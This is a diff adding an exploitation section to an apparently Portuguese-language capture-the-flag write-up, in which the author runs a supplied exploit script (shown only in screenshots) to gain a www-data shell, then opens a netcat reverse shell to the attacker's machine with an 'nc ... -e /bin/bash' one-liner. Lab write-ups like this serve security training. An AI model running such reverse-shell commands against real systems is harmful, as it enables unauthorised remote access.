@@ -70,5 +70,35 @@ whatweb http://10.10.20.73/ranch/
 
 <p align="center"> <img width="1500px" height="105" alt="image" src="https://github.com/user-attachments/assets/43dff6a6-bc75-42f4-939c-11609e7d4ce9" /> </p>
 
+## 🔍 Exploração
 
+Como a própria room já entrega qual script devemos usar pra explorar a falha, só precisamos fazer uns ajustes rápidos pra que ele funcione corretamente.
+Teremos que alterar três linhas:
 
+<p align="center"> <img width="1500px" height="910" alt="image" src="https://github.com/user-attachments/assets/38497ec3-56a6-4701-84e3-dedc1eeb9eeb" /></p>
+
+Com tudo ajustado, é só rodar:
+
+````bash
+python3 red.py
+````
+<p align="center"> <img width="1500px" height="247" alt="image" src="https://github.com/user-attachments/assets/311f64df-e849-4803-a391-eb758f886bc1" /></p>
+Pronto! Já garantimos uma shell como www-data.
+
+Agora, bora pegar uma shell reversa mais confortável.
+Primeiro, iniciamos o listener no Kali:
+
+````bash
+nc -nlvp 445
+````
+<p align="center"> <img width="1500px" height="84" alt="image" src="https://github.com/user-attachments/assets/86c9b2b3-a377-436d-89a0-21860097f787" /></p>
+
+Depois, do lado da vítima:
+
+````bash
+nc 10.21.173.102 445 -e /bin/bash
+````
+Conexão recebida com sucesso:
+<p align="center"> <img width="1500px" height="135" alt="image" src="https://github.com/user-attachments/assets/4edbc4e9-34f3-4eb2-a9f6-d57f6a73f892" /></p>
+
+Pra fechar, spawnamos uma shell interativa e ta na mão.
